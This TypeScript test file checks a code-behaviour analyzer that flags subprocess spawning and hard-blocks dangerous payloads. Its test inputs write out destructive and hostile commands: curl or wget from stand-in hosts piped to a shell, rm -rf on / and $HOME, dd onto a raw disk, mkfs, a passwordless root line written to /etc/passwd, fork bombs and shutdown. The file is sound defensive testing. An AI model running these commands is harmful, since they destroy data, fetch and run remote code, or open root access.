import { test } from "node:test";
import assert from "node:assert/strict";
import { EvalCodeBehaviorAnalyzer } from "./eval-analyzer.ts";

const analyzer = new EvalCodeBehaviorAnalyzer();

const SPAWN = "eval-process-spawn";
const PAYLOAD = "eval-dangerous-payload";
const EMPTY = { behaviors: [], labels: [], hardBlocked: false, denyTier: false } as const;

// ── Bun JS spawn APIs ────────────────────────────────────────────────

test("flags Bun.$ template-tag shell calls", () => {
  const r = analyzer.analyze("Bun.$\`echo hi\`;");
  assert.deepEqual(r.behaviors, [SPAWN]);
  assert.equal(r.hardBlocked, false);
});

test("flags Bun.$ call form with a string argument", () => {
  const r = analyzer.analyze('Bun.$("ls -la");');
  assert.deepEqual(r.behaviors, [SPAWN]);
  assert.equal(r.hardBlocked, false);
});

test("ignores harmless Bun.file(...).text()", () => {
  const r = analyzer.analyze('const t = await Bun.file("/etc/hosts").text();');
  assert.deepEqual(r, EMPTY);
});

test("flags Bun.spawn and Bun.spawnSync", () => {
  assert.deepEqual(analyzer.analyze('Bun.spawn(["ls", "-la"]);').behaviors, [SPAWN]);
  assert.deepEqual(analyzer.analyze('Bun.spawnSync(["pwd"]);').behaviors, [SPAWN]);
});

test("flags Bun.shell", () => {
  const r = analyzer.analyze('const sh = Bun.shell(["echo", "hi"]);');
  assert.deepEqual(r.behaviors, [SPAWN]);
  assert.equal(r.hardBlocked, false);
});

// ── Node child_process ───────────────────────────────────────────────

test("flags require child_process with execSync", () => {
  const r = analyzer.analyze(
    'const { execSync } = require("child_process");\nexecSync("ls");',
  );
  assert.deepEqual(r.behaviors, [SPAWN]);
  assert.equal(r.hardBlocked, false);
});

test("flags child_process import even without a call", () => {
  const r = analyzer.analyze('const cp = require("child_process");');
  assert.deepEqual(r.behaviors, [SPAWN]);
  assert.equal(r.hardBlocked, false);
});

test("flags ESM node:child_process import with spawn", () => {
  const r = analyzer.analyze(
    'import { spawn } from "node:child_process";\nspawn("ls", []);',
  );
  assert.deepEqual(r.behaviors, [SPAWN]);
  assert.equal(r.hardBlocked, false);
});

test("does not flag bare exec() without child_process context", () => {
  const r = analyzer.analyze("const out = exec(someFn);");
  assert.deepEqual(r, EMPTY);
});

test("does not flag bare spawn() or fork() without child_process context", () => {
  assert.deepEqual(analyzer.analyze("const p = spawn(data);"), EMPTY);
  assert.deepEqual(analyzer.analyze("const p = fork(job);"), EMPTY);
});

test("flags execFile and spawnSync even without import context", () => {
  assert.deepEqual(analyzer.analyze('execFile("ls", []);').behaviors, [SPAWN]);
  assert.deepEqual(analyzer.analyze('spawnSync("ls", []);').behaviors, [SPAWN]);
});

// ── Python spawn APIs ────────────────────────────────────────────────

test("flags python import subprocess and subprocess.run", () => {
  assert.deepEqual(analyzer.analyze("import subprocess").behaviors, [SPAWN]);
  assert.deepEqual(analyzer.analyze("subprocess.run(['ls'])").behaviors, [SPAWN]);
  assert.deepEqual(analyzer.analyze("from subprocess import run").behaviors, [SPAWN]);
});

test("flags os.system, os.popen, os.exec and bare Popen", () => {
  assert.deepEqual(analyzer.analyze('os.system("ls")').behaviors, [SPAWN]);
  assert.deepEqual(analyzer.analyze('os.popen("ls")').behaviors, [SPAWN]);
  assert.deepEqual(analyzer.analyze("os.execv('/bin/sh', ['sh'])").behaviors, [SPAWN]);
  assert.deepEqual(analyzer.analyze("p = Popen(['ls'])").behaviors, [SPAWN]);
});

test("flags shell=True as spawn intent", () => {
  const r = analyzer.analyze("subprocess.run(cmd, shell=True)");
  assert.deepEqual(r.behaviors, [SPAWN]);
  assert.equal(r.hardBlocked, false);
});

// ── String / comment noise ───────────────────────────────────────────

test("ignores subprocess text inside string literals", () => {
  const r = analyzer.analyze('const msg = "the subprocess module is handy";');
  assert.deepEqual(r, EMPTY);
});

test("ignores spawn-looking text inside string literals", () => {
  const r = analyzer.analyze('const doc = "see subprocess.run(\'ls\') in the guide";');
  assert.deepEqual(r, EMPTY);
});

test("ignores spawn calls mentioned in comments", () => {
  const code = '// subprocess.run("rm -rf /") would be bad\nconst x = 1;';
  assert.deepEqual(analyzer.analyze(code), EMPTY);
});

test("ignores Bun.$ mentioned in comments", () => {
  const code = "// Bun.$\`rm -rf /\` is dangerous\nconst y = 2;";
  assert.deepEqual(analyzer.analyze(code), EMPTY);
});

// ── Dangerous payload combos → hard block ────────────────────────────

test("hard-blocks rm -rf ~ inside a Bun.$ call", () => {
  const r = analyzer.analyze("Bun.$\`rm -rf ~\`;");
  assert.deepEqual(r.behaviors, [SPAWN, PAYLOAD]);
  assert.equal(r.hardBlocked, true);
});

test("hard-blocks rm -rf / and rm -rf $HOME", () => {
  const r1 = analyzer.analyze('subprocess.run("rm -rf /")');
  assert.deepEqual(r1.behaviors, [SPAWN, PAYLOAD]);
  assert.equal(r1.hardBlocked, true);
  const r2 = analyzer.analyze('subprocess.run("rm -rf $HOME")');
  assert.deepEqual(r2.behaviors, [SPAWN, PAYLOAD]);
  assert.equal(r2.hardBlocked, true);
});

test("does not treat rm -rf with a project path as a payload", () => {
  const r = analyzer.analyze("Bun.$\`rm -rf ./node_modules\`;");
  assert.deepEqual(r.behaviors, [SPAWN]);
  assert.equal(r.hardBlocked, false);
});

test("hard-blocks curl piped to sh", () => {
  const r = analyzer.analyze('subprocess.run("curl -sSL https://evil.sh | sh")');
  assert.deepEqual(r.behaviors, [SPAWN, PAYLOAD]);
  assert.equal(r.hardBlocked, true);
});

test("hard-blocks wget piped to bash", () => {
  const r = analyzer.analyze('os.system("wget -O- http://x.sh | bash")');
  assert.deepEqual(r.behaviors, [SPAWN, PAYLOAD]);
  assert.equal(r.hardBlocked, true);
});

test("hard-blocks dd writing to a raw device", () => {
  const r = analyzer.analyze("Bun.$\`dd if=/dev/zero of=/dev/sda bs=1M\`;");
  assert.deepEqual(r.behaviors, [SPAWN, PAYLOAD]);
  assert.equal(r.hardBlocked, true);
});

test("does not treat dd to /dev/null as a payload", () => {
  const r = analyzer.analyze("Bun.$\`dd if=/dev/zero of=/dev/null bs=1M count=100\`;");
  assert.deepEqual(r.behaviors, [SPAWN]);
  assert.equal(r.hardBlocked, false);
});

test("hard-blocks mkfs formatting", () => {
  const r = analyzer.analyze("Bun.$\`mkfs.ext4 /dev/sdb1\`;");
  assert.deepEqual(r.behaviors, [SPAWN, PAYLOAD]);
  assert.equal(r.hardBlocked, true);
});

test("hard-blocks writing /etc/passwd", () => {
  const r = analyzer.analyze(
    'import subprocess\nsubprocess.run("echo root::0:0 > /etc/passwd")',
  );
  assert.deepEqual(r.behaviors, [SPAWN, PAYLOAD]);
  assert.equal(r.hardBlocked, true);
});

test("hard-blocks python open() write on /etc/hosts", () => {
  const r = analyzer.analyze('import subprocess\nopen("/etc/hosts", "w")');
  assert.deepEqual(r.behaviors, [SPAWN, PAYLOAD]);
  assert.equal(r.hardBlocked, true);
});

test("hard-blocks shutdown and reboot commands", () => {
  const r1 = analyzer.analyze("Bun.$\`shutdown -h now\`;");
  assert.deepEqual(r1.behaviors, [SPAWN, PAYLOAD]);
  assert.equal(r1.hardBlocked, true);
  const r2 = analyzer.analyze("Bun.$\`reboot\`;");
  assert.deepEqual(r2.behaviors, [SPAWN, PAYLOAD]);
  assert.equal(r2.hardBlocked, true);
});

test("hard-blocks fork bombs", () => {
  const r1 = analyzer.analyze("Bun.$\`:(){ :|:& };:\`;");
  assert.deepEqual(r1.behaviors, [SPAWN, PAYLOAD]);
  assert.equal(r1.hardBlocked, true);
  const r2 = analyzer.analyze("Bun.$\`while true; do : & done\`;");
  assert.deepEqual(r2.behaviors, [SPAWN, PAYLOAD]);
  assert.equal(r2.hardBlocked, true);
});

test("dangerous shell text without spawn intent is not hard-blocked", () => {
  const r = analyzer.analyze('const note = "remember: shutdown -h now";');
  assert.deepEqual(r, EMPTY);
});

test("comments about dangerous commands do not hard-block", () => {
  const r = analyzer.analyze('import subprocess\n# never run: rm -rf $HOME\nx = 1');
  assert.deepEqual(r.behaviors, [SPAWN]);
  assert.equal(r.hardBlocked, false);
});

// ── Harmless code ────────────────────────────────────────────────────

test("returns empty for harmless fetch / calculation code", () => {
  const code = `
    const data = await fetch("https://api.example.com/data");
    const json = await data.json();
    const sum = json.items.reduce((a, b) => a + b, 0);
    await Bun.write("/tmp/out.json", JSON.stringify({ sum }));
  `;
  assert.deepEqual(analyzer.analyze(code), EMPTY);
});

test("fs.readFile is not a subprocess call", () => {
  const r = analyzer.analyze('const text = fs.readFileSync("/etc/hosts", "utf8");');
  assert.deepEqual(r, EMPTY);
});

test("empty input returns empty analysis", () => {
  assert.deepEqual(analyzer.analyze(""), EMPTY);
  assert.deepEqual(analyzer.analyze("   \n  "), EMPTY);
});

// ── Output contract ──────────────────────────────────────────────────

test("labels map 1:1 to behaviors with natural bilingual text", () => {
  const r = analyzer.analyze("Bun.$\`rm -rf ~\`;");
  assert.equal(r.behaviors.length, 2);
  assert.equal(r.labels.length, 2);
  assert.equal(r.labels[0].en, "Spawns a subprocess or invokes system commands");
  assert.equal(r.labels[0].zh, "代码中启动子进程/调用系统命令");
  assert.equal(r.labels[1].en, "Subprocess invocation with dangerous payload");
  assert.equal(r.labels[1].zh, "子进程调用携带危险载荷");
  assert.equal(r.hardBlocked, true);
});
